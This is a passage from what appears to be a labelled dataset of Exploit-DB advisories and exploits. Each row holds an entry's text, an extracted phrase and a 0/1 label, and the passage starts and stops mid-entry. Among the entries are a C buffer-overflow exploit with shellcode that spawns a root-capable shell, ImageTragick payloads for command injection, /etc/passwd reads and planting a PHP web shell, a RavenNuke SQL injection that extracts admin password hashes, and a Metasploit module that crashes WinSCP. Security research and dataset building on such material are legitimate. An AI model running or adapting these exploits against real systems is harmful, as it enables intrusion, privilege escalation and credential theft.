information security and risk management solutions. Our team has expert skills in assessment and assurance, strategy and architecture, and deployment through to ongoing management. We are Australia's premier application penetration testing firm and trusted IT security advisor to many of the countries largest organisations.  Sense of Security Pty Ltd  Level 8, 66 King St Sydney NSW 2000 AUSTRALIA  T: +61 (0)2 9290 4444 F: +61 (0)2 9290 4455 W: http://www.senseofsecurity.com.au E: info@senseofsecurity.com.au Twitter: @ITsecurityAU  The latest version of this advisory can be found at: http://www.senseofsecurity.com.au/advisories/SOS-11-006.pdf  Other Sense of Security advisories can be found at: http://www.senseofsecurity.com.au/research/it-security-advisories.php",supplying a single quote,1
42235,"Microsoft Windows - 'USP10!ttoGetTableData' Uniscribe Font Processing Out-of-Bounds Memory Read Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1199  We have encountered a crash in the Windows Uniscribe user-mode library, in the USP10!ttoGetTableData function, while trying to display text using a corrupted TTF font file:  --- (210.274): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=000002f6 ebx=000000d0 ecx=0361c003 edx=0000d0d0 esi=0361c000 edi=016101e4 eip=774d3d43 esp=0046f1e0 ebp=0046f1f0 iopl=0         nv up ei pl nz na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 USP10!ttoGetTableData+0x1aa3: 774d3d43 660fb606        movzx   ax,byte ptr [esi]          ds:0023:0361c000=??  0:000> kb  # ChildEBP RetAddr  Args to Child               00 0046f1f0 774d2e10 00000000 00000001 0361b734 USP10!ttoGetTableData+0x1aa3 01 0046f230 774d2d68 0361b73c 036255f8 0046f250 USP10!ttoGetTableData+0xb70 02 0046f258 774d22f1 036255f8 036255f8 0361b734 USP10!ttoGetTableData+0xac8 03 0046f26c 774c75b8 03619fd0 036199d0 0046f308 USP10!ttoGetTableData+0x51 04 0046f2cc 774c7124 0000001a 035b3d88 035c1fa8 USP10!LoadTTOArabicShapeTables+0x3e8 05 0046f2e0 774cc734 9a010536 035b3d88 035a6124 USP10!LoadArabicShapeTables+0xd4 06 0046f2fc 774ba5a0 9a010536 036197d0 0000001a USP10!ArabicLoadTbl+0xd4 07 0046f324 774ba692 035a6124 9a010536 0000001a USP10!UpdateCache+0xb0 08 0046f338 774c15fd 9a010536 035a6000 774c16ab USP10!ScriptCheckCache+0x62 09 0046f344 774c16ab 00000001 00000001 00000000 USP10!GetShapeFunction+0xd 0a 0046f37c 774c2bd4 00000001 00000000 0046f3fc USP10!RenderItemNoFallback+0x5b 0b 0046f3a8 774c2e62 00000001 00000000 0046f3fc USP10!RenderItemWithFallback+0x104 0c 0046f3cc 774c43f9 00000000 0046f3fc 035a6124 USP10!RenderItem+0x22 0d 0046f410 774b7a04 000004a0 00000400 9a010536 USP10!ScriptStringAnalyzeGlyphs+0x1e9 0e 0046f428 760a1736 9a010536 035a6040 0000000a USP10!ScriptStringAnalyse+0x284 0f 0046f474 760a18c1 9a010536 0046f8f8 0000000a LPK!LpkStringAnalyse+0xe5 10 0046f570 760a17b4 9a010536 00000000 00000000 LPK!LpkCharsetDraw+0x332 11 0046f5a4 77df56a9 9a010536 00000000 00000000 LPK!LpkDrawTextEx+0x40 12 0046f5e4 77df5a64 9a010536 00000058 00000000 USER32!DT_DrawStr+0x13c 13 0046f630 77df580f 9a010536 0046f8f8 0046f90c USER32!DT_GetLineBreak+0x78 14 0046f6dc 77df5882 9a010536 00000000 0000000a USER32!DrawTextExWorker+0x250 15 0046f700 77df5b68 9a010536 0046f8f8 ffffffff USER32!DrawTextExW+0x1e [...]  0:000> !heap -p -a esi-1     address 0361bfff found in     _DPH_HEAP_ROOT @ 35a1000     in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                  35a1780:          361b1b0              e4e -          361b000             2000     73448e89 verifier!AVrfDebugPageHeapAllocate+0x00000229     77d26206 ntdll!RtlDebugAllocateHeap+0x00000030     77cea127 ntdll!RtlpAllocateHeap+0x000000c4     77cb5950 ntdll!RtlAllocateHeap+0x0000023a     7433ae6a vrfcore!VerifierSetAPIClassName+0x000000aa     774c6724 USP10!UspAllocCache+0x00000054     774c728f USP10!LoadTTOArabicShapeTables+0x000000bf     774c7124 USP10!LoadArabicShapeTables+0x000000d4     774cc734 USP10!ArabicLoadTbl+0x000000d4     774ba5a0 USP10!UpdateCache+0x000000b0     774ba692 USP10!ScriptCheckCache+0x00000062     774c15fd USP10!GetShapeFunction+0x0000000d     774c2bd4 USP10!RenderItemWithFallback+0x00000104     774c2e62 USP10!RenderItem+0x00000022     774c43f9 USP10!ScriptStringAnalyzeGlyphs+0x000001e9     774b7a04 USP10!ScriptStringAnalyse+0x00000284     760a1736 LPK!LpkStringAnalyse+0x000000e5     760a18c1 LPK!LpkCharsetDraw+0x00000332     760a17b4 LPK!LpkDrawTextEx+0x00000040     77df56a9 USER32!DT_DrawStr+0x0000013c     77df5a64 USER32!DT_GetLineBreak+0x00000078     77df580f USER32!DrawTextExWorker+0x00000250     77df5882 USER32!DrawTextExW+0x0000001e     77df5b68 USER32!DrawTextW+0x0000004d     [...] ---  The issue reproduces on Windows 7, and could be potentially used to disclose sensitive data from the process heap. It is easiest to reproduce with PageHeap enabled, but it is also possible to observe a crash in a default system configuration. In order to reproduce the problem with the provided samples, it might be necessary to use a custom program which displays all of the font's glyphs at various point sizes.  Attached are 3 proof of concept malformed font files which trigger the crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42235.zip",a corrupted TTF font file,1
21960,"gBook 1.4 - Administrative Access source: https://www.securityfocus.com/bid/6033/info  A vulnerability has been discovered in gBook v1.4.  It has been reported that it is possible for an unauthorized attacker to gain administrative access to gBook by passing a malicious request to a php script.  Exploiting this issue could allow unauthorized attackers to execute arbitrary administrative actions against the target guestbook, such as corrupt valid user supplied entries.   http://[Target]/gb/index.php?login=true",passing a malicious request to a php script,1
40585,"Lenovo ThinkVantage Communications Utility 3.0.42.0 - Unquoted Service Path Privilege Escalation # Exploit Title: Lenovo ThinkVantage Communications Utility - Unquoted Service Path Privilege Escalation # Date: 10/19/2016 # Exploit Author: Joey Lane # Version: 3.0.42.0 # Tested on: Windows 7 Professional   The Lenovo ThinkVantage Communications Utility installs 2 services with unquoted service paths.  This enables a local privilege escalation vulnerability. To exploit this vulnerability, a local attacker can insert an executable file in the path of either service.  Rebooting the system or restarting either service will run the malicious executable with elevated privileges.     This was tested on version 3.0.42.0, but other versions may be affected as well.     ---------------------------------------------------------------------------   C:\>sc qc LENOVO.CAMMUTE                                                         [SC] QueryServiceConfig SUCCESS                                                                                                                                   SERVICE_NAME: LENOVO.CAMMUTE                                                             TYPE               : 10  WIN32_OWN_PROCESS                                       START_TYPE         : 2   AUTO_START                                              ERROR_CONTROL      : 0   IGNORE                                                  BINARY_PATH_NAME   : C:\Program Files\Lenovo\Communications Utility\CAMMUTE.exe                                                                                  LOAD_ORDER_GROUP   :                                                             TAG                : 0                                                           DISPLAY_NAME       : Lenovo Camera Mute                                          DEPENDENCIES       :                                                             SERVICE_START_NAME : LocalSystem   C:\>sc qc LENOVO.TPKNRSVC                                                        [SC] QueryServiceConfig SUCCESS                                                                                                                                   SERVICE_NAME: LENOVO.TPKNRSVC                                                            TYPE               : 10  WIN32_OWN_PROCESS                                       START_TYPE         : 2   AUTO_START                                              ERROR_CONTROL      : 0   IGNORE                                                  BINARY_PATH_NAME   : C:\Program Files\Lenovo\Communications Utility\TPKNRSVC.exe                                                                                 LOAD_ORDER_GROUP   :                                                             TAG                : 0                                                           DISPLAY_NAME       : Lenovo Keyboard Noise Reduction                             DEPENDENCIES       :                                                             SERVICE_START_NAME : LocalSystem   ---------------------------------------------------------------------------     EXAMPLE:   Using the BINARY_PATH_NAME listed above as an example, an executable named ""Program.exe"" could be placed in ""C:\"", and it would be executed as the Local System user next time the service was restarted.   ############################################################  From Lenovo PSIRT:  This issue was fixed in version 3.0.44.0, which was released on June 4, 2013. README for Lenovo Communications Utility program:  https://download.lenovo.com/pccbbs/mobiles/grcu19ww.txt  3.0.44.0             01     2013/06/04 <3.0.44.0> - (Fix) Fixed the vulnerability issue of service program registration. - (Fix) Fixed the issue that vcamsvc.exe might crash. - (Fix) Fixed the issue that TpKnrres.exe might crash. - (Fix) Fixed the issue that TPKNRSVC.exe might crash.",insert an executable file in the path of either service,1
39767,"ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabilities Nikolay Ermishkin from the Mail.Ru Security Team discovered several vulnerabilities in ImageMagick. We've reported these issues to developers of ImageMagick and they made a fix for RCE in sources and released new version (6.9.3-9 released 2016-04-30 http://legacy.imagemagick.org/script/changelog.php), but this fix seems to be incomplete. We are still working with developers.  ImageMagick: Multiple vulnerabilities in image decoder  1. CVE-2016-3714 - Insufficient shell characters filtering leads to (potentially remote) code execution  Insufficient filtering for filename passed to delegate's command allows remote code execution during conversion of several file formats.  ImageMagick allows to process files with external libraries. This feature is called 'delegate'. It is implemented as a system() with command string ('command') from the config file delegates.xml with actual value for different params (input/output filenames etc). Due to insufficient %M param filtering it is possible to conduct shell command injection. One of the default delegate's command is used to handle https requests: ""wget"" -q -O ""%o"" ""https:%M"" where %M is the actual link from the input. It is possible to pass the value like `https://example.com""|ls ""-la` and execute unexpected 'ls -la'. (wget or curl should be installed)  $ convert 'https://example.com""|ls ""-la' out.png total 32 drwxr-xr-x 6 user group 204 Apr 29 23:08 . drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 .. ...   The most dangerous part is ImageMagick supports several formats like svg, mvg (thanks to https://hackerone.com/stewie for his research of this file format and idea of the local file read vulnerability in ImageMagick, see below), maybe some others - which allow to include external files from any supported protocol including delegates. As a result, any service, which uses ImageMagick to process user supplied images and uses default delegates.xml / policy.xml, may be vulnerable to this issue.  exploit.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 fill 'url(https://example.com/image.jpg""|ls ""-la)' pop graphic-context  exploit.svg -=-=-=-=-=-=-=-=- <?xml version=""1.0"" standalone=""no""?> <!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd""> <svg width=""640px"" height=""480px"" version=""1.1"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink= ""http://www.w3.org/1999/xlink""> <image xlink:href=""https://example.com/image.jpg""|ls ""-la"" x=""0"" y=""0"" height=""640px"" width=""480px""/> </svg>  $ convert exploit.mvg out.png total 32 drwxr-xr-x 6 user group 204 Apr 29 23:08 . drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 .. ...  ImageMagick tries to guess the type of the file by it's content, so exploitation doesn't depend on the file extension. You can rename exploit.mvg to exploit.jpg or exploit.png to bypass file type checks. In addition, ImageMagick's tool 'identify' is also vulnerable, so it can't be used as a protection to filter file by it's content and creates additional attack vectors (e.g. via 'less exploit.jpg', because 'identify' is invoked via lesspipe.sh). Ubuntu 14.04 and OS X, latest system packages (ImageMagick 6.9.3-7 Q16 x86_64 2016-04-27 and ImageMagick 6.8.6-10 2016-04-29 Q16) and latest sources from 6 and 7 branches all are vulnerable. Ghostscript and wget (or curl) should be installed on the system for successful PoC execution. For svg PoC ImageMagick's svg parser should be used, not rsvg.  All other issues also rely on dangerous ImageMagick feature of external files inclusion from any supported protocol in formats like svg and mvg.  2. CVE-2016-3718 - SSRF It is possible to make HTTP GET or FTP request:  ssrf.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 fill 'url(http://example.com/)' pop graphic-context  $ convert ssrf.mvg out.png # makes http request to example.com  3. CVE-2016-3715 - File deletion It is possible to delete files by using ImageMagick's 'ephemeral' pseudo protocol which deletes files after reading:  delete_file.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'ephemeral:/tmp/delete.txt' popgraphic-context  $ touch /tmp/delete.txt $ convert delete_file.mvg out.png # deletes /tmp/delete.txt  4. CVE-2016-3716 - File moving It is possible to move image files to file with any extension in any folder by using ImageMagick's 'msl' pseudo protocol. msl.txt and image.gif should exist in known location - /tmp/ for PoC (in real life it may be web service written in PHP, which allows to upload raw txt files and process images with ImageMagick):  file_move.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'msl:/tmp/msl.txt' popgraphic-context  /tmp/msl.txt -=-=-=-=-=-=-=-=- <?xml version=""1.0"" encoding=""UTF-8""?> <image> <read filename=""/tmp/image.gif"" /> <write filename=""/var/www/shell.php"" /> </image>  /tmp/image.gif - image with php shell inside (https://www.secgeek.net/POC/POC.gif for example)  $ convert file_move.mvg out.png # moves /tmp/image.gif to /var/www/shell.php  5. CVE-2016-3717 - Local file read (independently reported by original research author - https://hackerone.com/stewie) It is possible to get content of the files from the server by using ImageMagick's 'label' pseudo protocol:  file_read.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'label:@...c/passwd' pop graphic-context  $ convert file_read.mvg out.png # produces file with text rendered from /etc/passwd   How to mitigate the vulnerability.  Available patches appear to be incomplete. If you use ImageMagick or an affected library, we recommend you mitigate the known vulnerabilities by doing at least one these two things (but preferably both!): 1. Verify that all image files begin with the expected �magic bytes� corresponding to the image file types you support before sending them to ImageMagick for processing. (see FAQ for more info) 2. Use a policy file to disable the vulnerable ImageMagick coders. The global policy for ImageMagick is usually found in �/etc/ImageMagick�. This policy.xml example will disable the coders EPHEMERAL, URL, MVG, and MSL:  <policymap>     <policy domain=""coder"" rights=""none"" pattern=""EPHEMERAL"" />     <policy domain=""coder"" rights=""none"" pattern=""URL"" />     <policy domain=""coder"" rights=""none"" pattern=""HTTPS"" />     <policy domain=""coder"" rights=""none"" pattern=""MVG"" />     <policy domain=""coder"" rights=""none"" pattern=""MSL"" /> </policymap>   Vulnerability Disclosure Timeline: April, 21 2016 - file read vulnerability report for one of My.Com services from https://hackerone.com/stewie received by Mail.Ru Security Team. Issue is reportedly known to ImageMagic team. April, 21 2016 - file read vulnerability patched by My.Com development team April, 28 2016 - code execution vulnerability in ImageMagick was found by Nikolay Ermishkin from Mail.Ru Security Team while researching original report April, 30 2016 - code execution vulnerability reported to ImageMagick development team April, 30 2016 - code execution vulnerability fixed by ImageMagick (incomplete fix) April, 30 2016 - fixed ImageMagic version 6.9.3-9 published (incomplete fix) May, 1 2016 - ImageMagic informed of the fix bypass May, 2 2016 - limited disclosure to 'distros' mailing list May, 3 2016 - public disclosure at https://imagetragick.com/",ImageMagick,0
19883,"SuSE Linux 6.3/6.4 Gnomelib - Local Buffer Overflow // source: https://www.securityfocus.com/bid/1155/info  A vulnerability exists in the handling of the DISPLAY variable, in versions of Gnomelib shipped with S.u.S.E. Linux, version 6.3. By supplying a long buffer containing machine executable code in the DISPLAY environment variable, it is possible to execute arbitrary code with the permissions of the user running the binary. In the case of a setuid binary, it is possible to obtain the privileges of the user it is setuid to. This in turn may be used to elevate privileges, and in theory could result in local root compromise.  S.u.S.E. 6.3 ships with 1 setgid application, /opt/gnome/sbin/gnome-pty-helper, which is setgid tty. 6.4 ships with setgid gnome games. The version of gnomelib included with S.u.S.E. 6.4 is not vulnerable to this attack, however.  /* Gnomelib exploit by bladi & aLmUDeNa  All gnome apps have an exploitable buffer overflow (gnomelib) when get DISPLAY environment variable.  Affected: S.u.S.E Linux: 6.3  Not vulnerable: RedHat 6.x                 Linpus Linux release 6.3                 Debian                    NoTe: don't forget to put 6M in /tmp ---------(6M.c)--------- void main() {     setuid(geteuid());     setregid(getegid(), getegid());     system(""/bin/bash"");             } ---------(6M.c)---------  Bueno un saludo a todos los que nos conocen/quieren/odian, bueno ya llevamos 6 meses y esperamos que dure mucho mas ;*                                   bladi@euskalnet.net                                 almudena@hempcultivation.com */   #include <stdio.h> #include <stdlib.h> #define NOP                              0x90 #define RANFROM                         -1400 #define RANTO                            -300  int i,x; char *ptr; unsigned long *ptr2;   char execshell[] = ""\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"" ""\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"" ""\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/tmp/6M""; char buffer[164];  main(int argc, char *argv[]) {                          long get_sp(void) { __asm__(""movl %esp,%eax\n"");     }                                printf ("" jpuff    ver: 1.0  \n""); printf (""         by         \n""); printf ("" bladi & aLmUDeNa\n\n""); if (argc < 2 )                                {     printf("" Usage ./jpuff <gnome app>\n"");       printf(""    Try: ./jpuff /opt/gnome/bin/sol => you gain gid=40(game)\n"");     exit(1);     } for (x=RANFROM;x<RANTO;x=13+x)     {     for(i=0;i<164;i++)         buffer[i]=0x00;     ptr=buffer;         for(i=0;i<22;i++)           *(ptr++)=NOP;     for(i=0;i<strlen(execshell);i++)           *(ptr++)=execshell[i];     ptr2=(long *)ptr;     for(i=0;i<20;i++)                      *(ptr2++)=get_sp()+x;      setenv(""DISPLAY"",buffer,1);       system(argv[1]);     } printf(""\n- --( ExPLoIT DoNE )-- -\n""); printf(""Have a lot of fun... ;*\n\n"");   return 0; }",supplying a long buffer containing machine executable code in the DISPLAY environment variable,1
8068,"ravennuke 2.3.0 - Multiple Vulnerabilities [waraxe-2009-SA#072] - Multiple Vulnerabilities in RavenNuke 2.3.0 ===============================================================================  Author: Janek Vind ""waraxe"" Date: 16. February 2009 Location: Estonia, Tartu Web: http://www.waraxe.us/advisory-72.html   Description of vulnerable software: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  RavenNuke is a web-based automated news publishing and content management system based on PHP and MySQL. The system is fully controlled using a web-based graphical user interface (GUI). RavenNuke is an extensively changed fork of  the phpNuke\portal system.  http://ravenphpscripts.com/   List of found vulnerabilities ===============================================================================  1. Remote Php Code Execution in ""avatarlist.php"" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Security risk: High  Reasons:   1. uninitialized arrays ""patterns"" and ""replacements"" Preconditions:   1. attacker must be logged in as user Comments:   1. Exploit is using ""preg_replace"" e-modifier   2. ""register_globals"" setting does not matter   3. Sentinel will not stop this exploit   4. POST method will leave clean logs in most real-world cases  Test using GET method:  http://localhost/ravennuke230/modules.php?name=Your_Account&op=avatarlist &avatarcategory=gallery&patterns[6]=/a/e&replacements[6]=phpinfo()  Test using POST method: ------------------------------------------------------------ <html><body><center> <form action=""http://localhost/ravennuke230/modules.php? name=Your_Account&op=avatarlist"" method=""post""> <input type=""hidden"" name=""avatarcategory"" value=""gallery""> <input type=""hidden"" name=""patterns[6]"" value=""/a/e""> <input type=""hidden"" name=""replacements[6]"" value=""phpinfo()""> <input type=""submit"" value=""Test!""> </form> </center></body></html> ------------------------------------------------------------  Fragment of vulnerable source code: ------------------------------------------------------------ $patterns[0] = '/\.gif/'; $patterns[1] = '/\.png/'; ... $replacements[1] = ''; $replacements[0] = ''; ... $entryname = preg_replace($patterns, $replacements, $entry); ------------------------------------------------------------  Solution: initialize arrays before use.   2. Remote Php Code Execution in ""Your Account"" module ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Security risk: medium  Reasons:   1. insecure use of ""eval()"" php function Precoditions:   1. Attacker must have admin rights for ""Your Account"" in   order to change custom fields Comments:   1. This is privilege escalation vulnerability  Test:  1. log in as admin and go to ""Custom Fields"" in users administration:  http://localhost/ravennuke230/admin.php?op=yaCustomFields  2. insert ""_Z;phpinfo()"" (without quotes) into input box ""ID Field Name""  3. click ""Save fields""  4. now go to ""Users"":  http://localhost/ravennuke230/admin.php?op=yaUsers  and select ""User Details"" for any user, click ""OK"". Resulting page will display output of the ""phpinfo()"", done  :)   Fragment of vulnerable source code: ------------------------------------------------------- /* Get Custom Fields and display them in desired order ... $result = $db->sql_query('SELECT * FROM ' . $user_prefix . '_users_fields  WHERE need <> ""0"" AND public=""1"" ORDER BY pos'); ... while ($sqlvalue = $db->sql_fetchrow($result)) {   if (substr($sqlvalue['name'], 0, 1) == '_')  @eval('$name_exit = ' . $sqlvalue['name'] . ';'); -------------------------------------------------------   3. Sql Injection in ""Resend_Email"" module ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Security risk: medium  Reasons:   1. Insecure use of ""extract()"" php function Preconditions:   1. attacker must be logged in as admin  Comments:   1. This is privilege escalation vulnerability   2. POST method will leave clean logs in most real-world cases  Test using POST method: ------------------------------------------------------------ <html><body><center> <form action=""http://localhost/ravennuke230/modules.php ?name=Resend_Email"" method=""post""> <input type=""hidden"" name=""user_prefix""  value=""nuke_users_temp WHERE 1=2 UNION SELECT 1,2, CONCAT_WS(0x3a,aid,name,radminsuper,email,pwd),4,5,6,7,8 FROM nuke_authors-- ""> <input type=""submit"" value=""Test!""> </form> </center></body></html> ------------------------------------------------------------  Fragment of vulnerable source code: ------------------------------------------------------------ if (!is_admin($admin)) endit(_ACCESSDENIED); ... extract($HTTP_POST_VARS); ... $result = $db->sql_query('select user_id, username, user_email, user_password, user_regdate, check_num, time, requestor from '.$user_prefix.'_users_temp'); ------------------------------------------------------------  Solution: use EXTR_SKIP to avoid overwriting of existing variables   4. Remote Detection of Local Files in ""captcha.php"" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Security risk: low  Reasons:   1. uninitialized array ""aFonts"" Preconditions:   1. ""register_globals=on""   2. ""display_errors=on"" Comments:   1. multiple page refreshes may needed because of source code specifics   2. same method works for remote directories too!  Attacker is able to detect existance of remote files or directories via different error messages, emitted by php.  Test 1:  http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/waraxe  Result:  Warning: imageftbbox() [function.imageftbbox]: Invalid font filename in C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298  ""Invalid font filename"" --> file does not exist  One more possible error message:  Warning: imageftbbox(): Could not find/open font in ...  ""Could not find/open font"" --> file does not exist   Test 2:  http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/passwd  Result:  Warning: imageftbbox() [function.imageftbbox]: Could not read font in C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298  ""Could not read font"" --> file exists   How to fix: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Upgrade to new version 2.30.01   Disclosure Timeline: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  01/16/09 Developer contacted 01/16/09 Developer's initial response 01/17/09 Fidings sent to developer 02/15/09 Patched version 2.30.01 released by developer 02/16/09 Public disclosure   Greetings: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke, to all active waraxe.us forum members and to anyone else who know me!   Contact: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  come2waraxe@yahoo.com Janek Vind ""waraxe""  Waraxe forum:  http://www.waraxe.us/forums.html Personal homepage: http://www.janekvind.com/  ---------------------- [ EOF ] ------------------------------  # milw0rm.com [2009-02-16]",different error messages,1
41889,"WinSCP 5.9.4 - 'LIST' Denial of Service (Metasploit) ## # Exploit Title: WinSCP 5.9.4 - (LIST) Command Denial of service (Crush application)   # Date: [4-4-2017] mm.dd.yy # Exploit Author: [M.Ibrahim]  vulnbug@gmail.com # E-Mail:  vulnbug  <at>  gmail.com # Vendor Home Page: https://winscp.net/eng/index.php # Vendor download link: https://winscp.net/download/WinSCP-5.9.4-Setup.exe # Version: [WinSCP 5.9.4]  # Tested on: windows 7 x86 ## #put the file winSCP 5.9.4.rb in metasploit framework folder name exploit then write this command to refresh all module in metasploit ==> reload_all #then run -j  #now fake ftp server is ready  #try to connect to this fake ftp server with winscp client and it will crush ##  require 'msf/core'  class Metasploit3 < Msf::Auxiliary    include Exploit::Remote::TcpServer    def initialize()     super(       'Name'           => 'WinSCP CRUSHER',       'Description'    => %q{         This module will Crush WinSCP FTP client        },       'Author'         => [ 'M.Ibrahim <vulnbug[at]gmail.com>' ],       'License'        => MSF_LICENSE,       'References'     =>         [           [ 'URL', 'http://www.google.com' ],         ]       )     register_options(       [       OptPort.new('SRVPORT', [ true, ""The local port to listen on."", 21 ]),       OptString.new('FUZZCMDS', [ true, ""The FTP client server Command to crush."", ""LIST"", nil, /(?:[A-Z]+,?)+/ ]),       OptInt.new('STARTSIZE', [ true, ""Crush string startsize."",2000]),       OptInt.new('ENDSIZE', [ true, ""Max Fuzzing string size."",200000]),       OptInt.new('STEPSIZE', [ true, ""Increment fuzzing string each attempt."",1000]),       OptBool.new('RESET', [ true, ""Reset fuzzing values after client disconnects with QUIT cmd."",true]),       OptString.new('WELCOME', [ true, ""Fake FTP Server welcome message."",""FTP WinSCP server CRusher""]),       OptBool.new('CYCLIC', [ true, ""Use Cyclic pattern instead of A's ."",false]),       OptBool.new('ERROR', [ true, ""Reply with error codes only"",false]),       OptBool.new('EXTRALINE', [ true, ""Add extra CRLF's in response to LIST"",true])       ], self.class)   end        def support_ipv6?     false   end    def setup     super     @state = {}   end    def run     @fuzzsize=datastore['STARTSIZE'].to_i     exploit()   end       def on_client_connect(c)     @state[c] = {       :name => ""#{c.peerhost}:#{c.peerport}"",       :ip   => c.peerhost,       :port => c.peerport,       :user => nil,       :pass => nil     }          print_status(""Client connected : "" + c.peerhost)     active_data_port_for_client(c, 20)     send_response(c,"""",""WELCOME"",220,"" ""+datastore['WELCOME'])        end    def on_client_close(c)     @state.delete(c)   end       def passive_data_port_for_client(c)     @state[c][:mode] = :passive     if(not @state[c][:passive_sock])       s = Rex::Socket::TcpServer.create(         'LocalHost' => '0.0.0.0',         'LocalPort' => 0,         'Context'   => { 'Msf' => framework, 'MsfExploit' => self }       )       dport = s.getsockname[2]       @state[c][:passive_sock] = s       @state[c][:passive_port] = dport            end     @state[c][:passive_port]   end     def active_data_port_for_client(c,port)     @state[c][:mode] = :active     connector = Proc.new {       host = c.peerhost.dup       sock = Rex::Socket::Tcp.create(         'PeerHost' => host,         'PeerPort' => port,         'Context'   => { 'Msf' => framework, 'MsfExploit' => self }       )     }     @state[c][:active_connector] = connector     @state[c][:active_port]      = port       end     def establish_data_connection(c)          begin     Timeout.timeout(20) do       if(@state[c][:mode] == :active)         return @state[c][:active_connector].call()       end       if(@state[c][:mode] == :passive)         return @state[c][:passive_sock].accept       end     end          rescue ::Exception => e       print_error(""Failed to establish data connection: #{e.class} #{e}"")     end     nil   end       def on_client_data(c)      data = c.get_once     return if not data      cmd,arg = data.strip.split(/\s+/, 2)     arg ||= """"      return if not cmd      case cmd.upcase.strip      when 'USER'       @state[c][:user] = arg       send_response(c,arg,""USER"",331,"" User name okay, need password"")       return      when 'PASS'       @state[c][:pass] = arg       send_response(c,arg,""PASS"",230,""-Password accepted.\r\n230 User logged in."")       return      when 'QUIT'       if (datastore['RESET'])         print_status(""Resetting fuzz settings"")         @fuzzsize = datastore['STARTSIZE']         @stepsize = datastore['STEPSIZE']       end       print_status(""** Client disconnected **"")       send_response(c,arg,""QUIT"",221,"" User logged out"")       return      when 'SYST'       send_response(c,arg,""SYST"",215,"" UNIX Type: L8"")       return      when 'TYPE'       send_response(c,arg,""TYPE"",200,"" Type set to #{arg}"")       return      when 'CWD'       send_response(c,arg,""CWD"",250,"" CWD Command successful"")       return      when 'PWD'       send_response(c,arg,""PWD"",257,"" \""/\"" is current directory."")       return      when 'REST'       send_response(c,arg,""REST"",200,"" OK"")       return      when 'XPWD'       send_response(c,arg,""PWD"",257,"" \""/\"" is current directory"")       return      when 'SIZE'       send_response(c,arg,""SIZE"",213,"" 1"")       return      when 'MDTM'       send_response(c,arg,""MDTM"",213,"" #{Time.now.strftime(""%Y%m%d%H%M%S"")}"")       return      when 'CDUP'       send_response(c,arg,""CDUP"",257,"" \""/\"" is current directory"")       return      when 'PORT'       port = arg.split(',')[4,2]       if(not port and port.length == 2)         c.put(""500 Illegal PORT command.\r\n"")         return       end       port = port.map{|x| x.to_i}.pack('C*').unpack('n')[0]       active_data_port_for_client(c, port)       send_response(c,arg,""PORT"",200,"" PORT command successful"")       return      when 'PASV'        daddr = Rex::Socket.source_address(c.peerhost)       dport = passive_data_port_for_client(c)       @state[c][:daddr] = daddr       @state[c][:dport] = dport       pasv  = (daddr.split('.') + [dport].pack('n').unpack('CC')).join(',')       dofuzz = fuzz_this_cmd(""PASV"")       code = 227       if datastore['ERROR']         code = 557       end       if (dofuzz==1)          send_response(c,arg,""PASV"",code,"" Entering Passive Mode (#{@fuzzdata},1,1,1,1,1)\r\n"")         incr_fuzzsize()       else         send_response(c,arg,""PASV"",code,"" Entering Passive Mode (#{pasv})"")       end       return      when /^(LIST|NLST|LS)$/         conn = establish_data_connection(c)       if(not conn)         c.put(""425 Can't build data connection\r\n"")         return       end        code = 150       if datastore['ERROR']         code = 550       end       c.put(""#{code} Here comes the directory listing.\r\n"")       code = 226       if datastore['ERROR']         code = 550       end       c.put(""#{code} Directory send ok.\r\n"")       strfile = ""passwords.txt""       strfolder = ""Secret files""       dofuzz = fuzz_this_cmd(""LIST"")       if (dofuzz==1)         strfile = @fuzzdata + "".txt""         strfolder = @fuzzdata         paylen = @fuzzdata.length          incr_fuzzsize()       end        dirlist = """"       if 